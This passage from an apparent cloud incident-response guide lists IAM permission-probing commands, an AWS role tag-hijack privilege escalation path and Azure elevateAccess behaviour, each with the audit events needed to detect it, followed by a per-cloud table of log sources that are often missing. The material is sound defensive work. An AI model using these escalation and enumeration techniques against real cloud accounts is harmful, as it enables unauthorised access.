- **Simulate/can-i self-probe**: `iam simulate-principal-policy` (AWS), `az rest POST providers/Microsoft.Authorization/checkAccess` (Azure), `gcloud policy-troubleshoot iam` / `gcloud asset analyze-iam-policy` (GCP) — all can be detected as "attacker trying to understand permissions". Blue teams often do not flag this because it is not "destructive activity".
- **Enumeration rotation check**: post-rotation, the old Access Key ID can appear in `LookupEvents` when used. Check unique `userIdentity.accessKeyId` as a pivot, not just the user.
- **IAM entity tag hijack** (AWS 2023+): a role with condition `aws:PrincipalTag/team` can change its own tags if it has `iam:TagRole` + `iam:UntagRole` + looser tag permissions. Events: `TagRole`, `UntagRole`.
- **Azure `elevateAccess`** idempotent — the second call does not error even if already active, so "no error" ≠ "newly activated". Check `directoryAudits` for activation time.
- **GCP `roles/owner` in project ≠ org admin** — can still be blocked by org policy (`iam.allowedPolicyMemberDomains`, `iam.disableServiceAccountKeyCreation`). Check org policy before concluding "full control".
- **Cloud-specific network deny** (SCP in AWS Org, Azure Management Lock + Deny Assignments, GCP `iam.allowedPolicyMemberDomains` + VPC Service Controls) can make "permission exists in policy but fails at runtime". VPC-SC `ERR_VPC_SERVICE_CONTROLS` in GCP is a classic pitfall when enumerating storage/BQ.

### 7.12.3 Summary of minimum traces that must be checked during IR (per cloud)

| Cloud | Primary Source | Often Missing |
|---|---|---|
| AWS | CloudTrail management events | `GetCallerIdentity`, `PassRole`, `GetSessionToken` (kadang), data events (S3 object, Lambda invoke detail) |
| Azure | Activity Log + Entra `AuditLogs` + Sign-in logs | ARM token issue against MI, `az rest` Graph ops (access Entra), MI IMDS |
| GCP | Admin Activity + Data Access (must be on) | `GenerateAccessToken`, `SignJwt`, `ExchangeToken`, `AccessSecretVersion`, `searchAll*`, GKE API calls (separate K8s audit) |

---

## [reasoning trace]


